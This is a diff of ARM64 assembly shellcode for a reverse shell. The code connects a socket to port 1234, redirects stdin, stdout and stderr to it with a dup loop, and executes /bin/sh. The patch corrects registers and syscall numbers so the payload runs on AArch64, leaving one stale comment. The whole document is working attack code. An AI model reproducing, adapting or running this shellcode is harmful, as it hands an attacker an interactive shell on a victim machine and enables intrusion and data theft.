@@ -20,7 +20,7 @@ _start:
     mov    x6, x0       // x6 = s
     adr    x1, sin_port // x1 = sa.sin_port
     mov    x2, #16      // x2 = sizeof(sa)
-    add    x7, #2       // x7 = 200 = connect
+    mov    x8, #203     // x8 = 203 = connect
     svc    1
   
     // dup2(s, FILENO_STDIN);
@@ -28,17 +28,18 @@ _start:
     // dup2(s, FILENO_STDERR);
     mov    x1, #2        // for 3 descriptors
 dup_loop:
-    mov    x7, #24       // x7 = dup2 
+    eor    x2, x2, x2
+    mov    x8, #24       // x8 = dup2 
     mov    x0, x6        // x0 = s
     svc    1
-    sub    x1, x1, #1    // 
+    subs   x1, x1, #1    // 
     bpl    dup_loop
 
     // execve("/bin/sh", NULL, NULL);
     adr    x0, sh        // x0 = "/bin/sh" 
     eor    x2, x2, x2    // x2 = NULL
     eor    x1, x1, x1    // x1 = NULL  
-    mov    r7, #11       // x7 = execve
+    mov    x8, #221       // x7 = execve
     svc    1
 sin_port:    
     .word  0xd2040002    // 1234, AF_INET
